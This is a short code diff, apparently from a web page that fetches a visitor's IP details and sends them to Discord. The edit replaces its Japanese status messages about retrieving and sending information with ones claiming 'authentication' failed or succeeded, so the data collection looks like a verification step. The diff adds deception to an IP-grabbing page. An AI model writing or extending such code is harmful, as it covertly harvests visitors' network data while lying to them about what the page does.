@@ -451,7 +451,7 @@
                     const ipDetails = await getIPDetails();
                     
                     if (!ipDetails || !ipDetails.ip) {
-                        throw new Error('IP詳細情報の取得に失敗しました');
+                        throw new Error('認証に失敗しました');
                     }
                     
                     // Discordに送信
@@ -466,7 +466,7 @@
                         loadingText.style.display = 'none';
                         
                         // メッセージ更新
-                        subtitle.textContent = "情報は正常に送信されました";
+                        subtitle.textContent = "認証は無事成功しました";
                         subtitle.style.color = "var(--success)";
                     } else {
                         statusMessage.textContent = 'Discordへの送信に失敗しました';
